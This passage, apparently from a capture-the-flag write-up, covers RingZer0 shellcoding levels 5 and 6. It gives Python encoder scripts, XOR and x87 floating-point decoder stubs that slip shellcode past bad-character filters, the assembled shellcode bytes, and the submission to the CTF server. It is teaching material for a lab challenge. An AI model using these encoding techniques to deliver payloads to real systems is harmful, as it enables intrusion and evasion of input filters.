</span><span class='line'><span class="k">def</span> <span class="nf">find_xor_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
</span><span class='line'>          <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
</span><span class='line'>              <span class="c"># return the two bytes that encode the required byte</span>
</span><span class='line'>              <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;cannot find proper byte for {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># build the bad char lookup array.</span>
</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">]</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'><span class="c"># I got a bit paranoid and decided that these bytes were badchars too</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">):</span>
</span><span class='line'>  <span class="n">badchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># read in the shellcode that we need to encode.</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;modified-shellcode3&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">sc</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>  <span class="n">sc</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pad out the shellcode to a multiple of four</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\xc3</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ill-named variables to hold the encrypted bytes</span>
</span><span class='line'><span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">commands</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">defines</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">num_commands</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="c"># iterate over each byte in the shellcode</span>
</span><span class='line'><span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>  <span class="c"># try to find two bytes that are not badchars themselves</span>
</span><span class='line'>  <span class="p">(</span><span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">)</span> <span class="o">=</span> <span class="n">find_xor_bytes</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># store those bytes</span>
</span><span class='line'>  <span class="n">storage</span> <span class="o">+=</span> <span class="n">b1</span>
</span><span class='line'>  <span class="n">encoded_bytes</span> <span class="o">+=</span> <span class="n">b2</span>
</span><span class='line'>  <span class="c"># if there are four bytes stored, add them to the output &amp; start again</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">storage</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>      <span class="c"># emit </span>
</span><span class='line'>      <span class="n">commands</span> <span class="o">+=</span> <span class="s">&quot;xor dword [rax+_shellcode{}-_shellcode], {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">storage</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">defines</span> <span class="o">+=</span> <span class="s">&quot;_shellcode{} dd {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">encoded_bytes</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">storage</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">encoded_bytes</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>      <span class="n">num_commands</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>              
</span><span class='line'><span class="c"># output the resulting assembly   </span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;bits 64</span>
</span><span class='line'><span class="s">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="s">;mov rax, 10</span>
</span><span class='line'><span class="s">;mov rdi, 0x400000</span>
</span><span class='line'><span class="s">;mov rsi, 0x1000</span>
</span><span class='line'><span class="s">;mov rdx, 7</span>
</span><span class='line'><span class="s">;syscall</span>
</span><span class='line'><span class="s">;lea rax, [_decoder]</span>
</span><span class='line'>
</span><span class='line'><span class="s">_shellcode:</span>
</span><span class='line'><span class="s">jmp _decoder</span>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">defines</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;_decoder:&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">commands</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;jmp _shellcode0&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This output the encoded shellcode as an assembly file. Using <code>nasm</code>, I could build it into shellcode again. For local testing, I included a call to <code>mprotect</code> and set the value of <code>rax</code> to the start of the shellcode, just like the situation on the remote server. The layout of the built shellcode (first encrypted bytes, then the decoder) is done on purpose: it avoids bad chars in the <code>xor dword [rax+offset]</code> instructions. The value for the offset should not be too high, as that would introduce bytes in the range <code>0x40</code> to <code>0x65</code>&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mi">10</span>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="mh">0x400000</span>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="mh">0x1000</span>
</span><span class='line'><span class="p">;</span><span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="mi">7</span>
</span><span class='line'><span class="p">;</span><span class="n">syscall</span>
</span><span class='line'><span class="p">;</span><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">_decoder</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">_shellcode</span><span class="p">:</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_decoder</span>
</span><span class='line'><span class="n">_shellcode0</span> <span class="n">dd</span> <span class="mh">0x70d02169</span>
</span><span class='line'><span class="n">_shellcode1</span> <span class="n">dd</span> <span class="mh">0x7a7e747f</span>
</span><span class='line'><span class="n">_shellcode2</span> <span class="n">dd</span> <span class="mh">0x151f7a6f</span>
</span><span class='line'><span class="n">_shellcode3</span> <span class="n">dd</span> <span class="mh">0x976912a0</span>
</span><span class='line'><span class="n">_shellcode4</span> <span class="n">dd</span> <span class="mh">0x69151fe7</span>
</span><span class='line'><span class="n">_shellcode5</span> <span class="n">dd</span> <span class="mh">0x1f866987</span>
</span><span class='line'><span class="n">_shellcode6</span> <span class="n">dd</span> <span class="mh">0x7011a015</span>
</span><span class='line'><span class="n">_shellcode7</span> <span class="n">dd</span> <span class="mh">0xd3151f7f</span>
</span><span class='line'>
</span><span class='line'><span class="n">_decoder</span><span class="p">:</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode0</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x20101021</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode1</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10202020</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode2</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10102010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode3</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10211010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode4</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x21101010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode5</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10102110</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode6</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x20101010</span>
</span><span class='line'><span class="n">xor</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">_shellcode7</span><span class="o">-</span><span class="n">_shellcode</span><span class="p">],</span> <span class="mh">0x10101020</span>
</span><span class='line'>
</span><span class='line'><span class="n">jmp</span> <span class="n">_shellcode0</span>
</span></code></pre></td></tr></table></div></figure>


<p>Feeling quite chuffed, I assembled it and checked for bad chars&hellip; there was one! A <code>0x0a</code> byte snuck in. This was because the addresses of the encoded dwords were, relative to <code>rax</code>: 2, 6, 10, 14, etc. I needed to add an offset, which I did:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">_shellcode</span><span class="p">:</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_decoder</span>
</span><span class='line'><span class="n">nop</span>
</span><span class='line'><span class="n">nop</span>
</span></code></pre></td></tr></table></div></figure>


<p>This took care of the problem. Yes, this shellcode could have been shorter, probably. A lot of the constants look similar, so I could have probably made the decoder smaller by selecting a &lsquo;magic&rsquo; constant. However, it worked!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span><span class="p">;</span> nasm -f bin ./completed2.asm<span class="p">;</span> xxd -c <span class="m">1</span> ./completed2 <span class="p">|</span> awk <span class="s1">&#39;{print &quot;\\x&quot;$2 }&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> wc -c ./completed2
</span><span class='line'>
</span><span class='line'><span class="se">\x</span>eb<span class="se">\x</span>22<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>69<span class="se">\x</span>21<span class="se">\x</span>d0<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>74<span class="se">\x</span>7e<span class="se">\x</span>7a<span class="se">\x</span>6f<span class="se">\x</span>7a<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>12<span class="se">\x</span>69<span class="se">\x</span>97<span class="se">\x</span>e7<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>69<span class="se">\x</span>87<span class="se">\x</span>69<span class="se">\x</span>86<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>11<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>d3<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>04<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>08<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>0c<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>14<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>18<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>1c<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>eb<span class="se">\x</span>a6
</span><span class='line'><span class="m">94</span> ./completed2
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>ssh level5@shellcode.ringzer0team.com -p 7771level5@shellcode.ringzer0team.com<span class="err">&#39;</span>s password:
</span><span class='line'>Linux ld64deb1 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
</span><span class='line'>Last login: Thu Feb  <span class="m">5</span> 17:23:29 <span class="m">2015</span> from 137.224.219.201
</span><span class='line'>
</span><span class='line'>RingZer0 Team CTF Shellcoding Level 5
</span><span class='line'>Submit your shellcode using hex representation <span class="s2">&quot;\xcc\xcd&quot;</span>.
</span><span class='line'>Type <span class="s2">&quot;end&quot;</span> to exit.
</span><span class='line'>
</span><span class='line'>This level have shellcode restriction. Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x65&quot;</span> max size <span class="m">100</span> bytes.
</span><span class='line'>You main goal is to <span class="nb">read</span> /flag/level5.flag
</span><span class='line'>
</span><span class='line'>shellcode&gt;<span class="se">\x</span>eb<span class="se">\x</span>22<span class="se">\x</span>90<span class="se">\x</span>90<span class="se">\x</span>69<span class="se">\x</span>21<span class="se">\x</span>d0<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>74<span class="se">\x</span>7e<span class="se">\x</span>7a<span class="se">\x</span>6f<span class="se">\x</span>7a<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>12<span class="se">\x</span>69<span class="se">\x</span>97<span class="se">\x</span>e7<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>69<span class="se">\x</span>87<span class="se">\x</span>69<span class="se">\x</span>86<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>a0<span class="se">\x</span>11<span class="se">\x</span>70<span class="se">\x</span>7f<span class="se">\x</span>1f<span class="se">\x</span>15<span class="se">\x</span>d3<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>04<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>08<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>0c<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>14<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>18<span class="se">\x</span>10<span class="se">\x</span>21<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>1c<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>20<span class="se">\x</span>81<span class="se">\x</span>70<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>10<span class="se">\x</span>eb<span class="se">\x</span>a6
</span><span class='line'>  Shellcode received...
</span><span class='line'>  Shellcode length <span class="o">(</span>94<span class="o">)</span> bytes.
</span><span class='line'>
</span><span class='line'>  Success: Executing shellcode...
</span><span class='line'>
</span><span class='line'>/flag/level5.flag^@
</span><span class='line'>FLAG-&lt;redacted&gt;
</span><span class='line'>  Error: SIGSEGV received I think your shellcode is not working.
</span></code></pre></td></tr></table></div></figure>


<h2>Level 6</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Bad char list <span class="s2">&quot;\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x81&quot;</span> max size <span class="m">90</span> bytes.
</span></code></pre></td></tr></table></div></figure>


<p>Things are beginning to look grim! Every time I came up with a solution, the next level would list one or more crucial bytes as a bad char. This time, <code>0x81</code> became a bad char, blocking the use of the <code>xor</code>.</p>

<p>I turned again to the gigantic table over at <a href="http://ref.x86asm.net/coder64.html">ref.x64asm.net</a>. I flipped through the list of available opcodes, looking for things that would allow me to decode and carve out the shellcode. Finally, my eyes caught the floating point instructions. One of the variants allows the use of integers as arguments for floating point operations:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>fild dword <span class="o">[</span>rax+rbx*4<span class="o">]</span>
</span><span class='line'>fiadd dword <span class="o">[</span>rax+rcx*4<span class="o">]</span>
</span><span class='line'>fistp dword <span class="o">[</span>rax+rcx*4<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>These instructions do not contain bad chars! Furthermore, they allow the use of <code>rax</code> as a pointer to the shellcode, enabling us to carve out stage 1. I used a similar trick as in level 5 to check the viability of this technique:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>_start:
</span><span class='line'>jmp _decode
</span><span class='line'>nop
</span><span class='line'>nop                     <span class="p">;</span> align the encoded shellcode to a dword boundary
</span><span class='line'>
</span><span class='line'>_stage1:
</span><span class='line'>
</span><span class='line'>_0 dd 0xc3c3c3c3        <span class="p">;</span> these rets should be transformed into jmp <span class="nv">$-</span>2
</span><span class='line'>_1 dd 0x90909090
</span><span class='line'>_2 dd 0x90909090
</span><span class='line'>_3 dd 0x90909090
</span><span class='line'>_4 dd 0x90909090
</span><span class='line'>_5 dd 0x90909090
</span><span class='line'>_6 dd 0x90909090
</span><span class='line'>
</span><span class='line'>_8 dd 0x3b283b28        <span class="p">;</span> funny enough, the constant <span class="k">for</span> the add is the same as <span class="k">for</span> the xor!
</span><span class='line'>_9 dd 0x90909090
</span><span class='line'>_a dd 0x90909090
</span><span class='line'>_b dd 0x90909090
</span><span class='line'>_c dd 0x90909090
</span><span class='line'>_d dd 0x90909090
</span><span class='line'>_e dd 0x90909090
</span><span class='line'>
</span><span class='line'>_decode:                <span class="p">;</span> i<span class="err">&#39;</span>d call this stage 0
</span><span class='line'>xor ecx,ecx             <span class="p">;</span> clear ecx and rcx
</span><span class='line'>xor ebx,ebx             <span class="p">;</span> clear ebx
</span><span class='line'>mov cl, <span class="o">(</span>_6-_start<span class="o">)</span>/4   <span class="p">;</span> starting dword <span class="k">for</span> shellcode
</span><span class='line'>mov bl, <span class="o">(</span>_e-_start<span class="o">)</span>/4   <span class="p">;</span> starting dword <span class="k">for</span> decoding constants
</span><span class='line'>_decodeloop:
</span><span class='line'>fild dword <span class="o">[</span>rax+rbx*4<span class="o">]</span>  <span class="p">;</span> load integer into st0
</span><span class='line'>dec bl
</span><span class='line'>fiadd dword <span class="o">[</span>rax+rcx*4<span class="o">]</span> <span class="p">;</span> add constant to st0
</span><span class='line'>fistp dword <span class="o">[</span>rax+rcx*4<span class="o">]</span> <span class="p">;</span> store integer at this position, effectively decoding the instructions
</span><span class='line'>loop _decodeloop        <span class="p">;</span> use the fact that rcx is now an index and a counter
</span><span class='line'>
</span><span class='line'>jmp _stage1             <span class="p">;</span> jump to -hopefully- decoded shellcode
</span></code></pre></td></tr></table></div></figure>


<p>Again, this hangs the remote program, confirming that this is a viable technique. I adjusted <code>encode.py</code> to generate the right constants. Prepare for some ultra-hacky python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">def</span> <span class="nf">find_sub_bytes</span><span class="p">(</span><span class="n">byte_required</span><span class="p">):</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">carry</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">byte_required</span><span class="p">)</span> <span class="o">-</span> <span class="n">carry</span> <span class="c"># compensate for possible carry from previously encoded byte</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
